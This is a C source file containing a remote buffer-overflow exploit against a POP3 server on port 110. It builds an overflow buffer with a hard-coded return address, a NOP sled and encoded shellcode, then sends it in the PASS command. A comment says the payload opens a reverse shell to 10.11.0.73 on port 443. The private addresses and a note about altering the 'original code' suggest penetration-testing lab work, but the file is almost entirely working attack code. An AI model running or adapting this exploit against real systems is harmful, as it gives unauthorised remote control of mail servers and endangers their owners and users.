#include <fcntl.h>
#include <stdio.h>
#include <stdlib.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <sys/wait.h>
#include <errno.h>
#include <netinet/in.h>
#include <netdb.h>
#include <string.h>

#define port 110
#define retadd "\x8f\x35\x4a\x5f"    /* "\x9f\x45\x3a\x77" original code */


/* reverse to 10.11.0.73 on port 443. shellcode is 351 bytes long */
char shellcode[] =
"\xd9\xc0\xbb\x82\x01\x25\xdc\xd9\x74\x24\xf4\x5d\x31\xc9\xb1"
"\x52\x31\x5d\x17\x83\xc5\x04\x03\xdf\x12\xc7\x29\x23\xfc\x85"
"\xd2\xdb\xfd\xe9\x5b\x3e\xcc\x29\x3f\x4b\x7f\x9a\x4b\x19\x8c"
"\x51\x19\x89\x07\x17\xb6\xbe\xa0\x92\xe0\xf1\x31\x8e\xd1\x90"
"\xb1\xcd\x05\x72\x8b\x1d\x58\x73\xcc\x40\x91\x21\x85\x0f\x04"
"\xd5\xa2\x5a\x95\x5e\xf8\x4b\x9d\x83\x49\x6d\x8c\x12\xc1\x34"
"\x0e\x95\x06\x4d\x07\x8d\x4b\x68\xd1\x26\xbf\x06\xe0\xee\xf1"
"\xe7\x4f\xcf\x3d\x1a\x91\x08\xf9\xc5\xe4\x60\xf9\x78\xff\xb7"
"\x83\xa6\x8a\x23\x23\x2c\x2c\x8f\xd5\xe1\xab\x44\xd9\x4e\xbf"
"\x02\xfe\x51\x6c\x39\xfa\xda\x93\xed\x8a\x99\xb7\x29\xd6\x7a"
"\xd9\x68\xb2\x2d\xe6\x6a\x1d\x91\x42\xe1\xb0\xc6\xfe\xa8\xdc"
"\x2b\x33\x52\x1d\x24\x44\x21\x2f\xeb\xfe\xad\x03\x64\xd9\x2a"
"\x63\x5f\x9d\xa4\x9a\x60\xde\xed\x58\x34\x8e\x85\x49\x35\x45"
"\x55\x75\xe0\xca\x05\xd9\x5b\xab\xf5\x99\x0b\x43\x1f\x16\x73"
"\x73\x20\xfc\x1c\x1e\xdb\x97\x28\xd4\xe3\x2e\x45\xe8\xe3\xb1"
"\x2e\x65\x05\xdb\x40\x20\x9e\x74\xf8\x69\x54\xe4\x05\xa4\x11"
"\x26\x8d\x4b\xe6\xe9\x66\x21\xf4\x9e\x86\x7c\xa6\x09\x98\xaa"
"\xce\xd6\x0b\x31\x0e\x90\x37\xee\x59\xf5\x86\xe7\x0f\xeb\xb1"
"\x51\x2d\xf6\x24\x99\xf5\x2d\x95\x24\xf4\xa0\xa1\x02\xe6\x7c"
"\x29\x0f\x52\xd1\x7c\xd9\x0c\x97\xd6\xab\xe6\x41\x84\x65\x6e"
"\x17\xe6\xb5\xe8\x18\x23\x40\x14\xa8\x9a\x15\x2b\x05\x4b\x92"
"\x54\x7b\xeb\x5d\x8f\x3f\x1b\x14\x8d\x16\xb4\xf1\x44\x2b\xd9"
"\x01\xb3\x68\xe4\x81\x31\x11\x13\x99\x30\x14\x5f\x1d\xa9\x64"
"\xf0\xc8\xcd\xdb\xf1\xd8";
 
struct sockaddr_in plm,lar,target;
 
int conn(char *ip)
{
 int sockfd;
 plm.sin_family = AF_INET;
 plm.sin_port = htons(port);
 plm.sin_addr.s_addr = inet_addr(ip);
 bzero(&(plm.sin_zero),8);
 sockfd = socket(AF_INET,SOCK_STREAM,0);
if((connect(sockfd,(struct sockaddr *)&plm,sizeof(struct sockaddr))) < 0)
{
 perror("[-] connect error!");
 exit(0);
}
 printf("[*] Connected to: %s.\n",ip);
 return sockfd;
}
 
int main(int argc, char *argv[])
{
    int xs;
    char out[1024];
    char *buffer = malloc(2960);
    memset(buffer, 0x00, 2960);
    char *off = malloc(2607);
    memset(off, 0x00, 2607);
    memset(off, 0x41, 2606);
    char *nop = malloc(17);
    memset(nop, 0x00, 17);
    memset(nop, 0x90, 16);
    strcat(buffer, off);
    strcat(buffer, retadd);
    strcat(buffer, nop);
    strcat(buffer, shellcode);

    printf("[+] I really hate C programming language.\n");
    xs = conn("10.11.8.148");
    read(xs, out, 1024);
    printf("[*] %s", out);
    write(xs,"USER username\r\n", 15);
    read(xs, out, 1024);
    printf("[*] %s", out);
    write(xs,"PASS ",5);
    write(xs,buffer,strlen(buffer));
    printf("Shellcode len: %d bytes\n",strlen(shellcode));
    printf("Buffer len: %d bytes\n",strlen(buffer));
    write(xs,"\r\n",4);
    close(xs);  
}
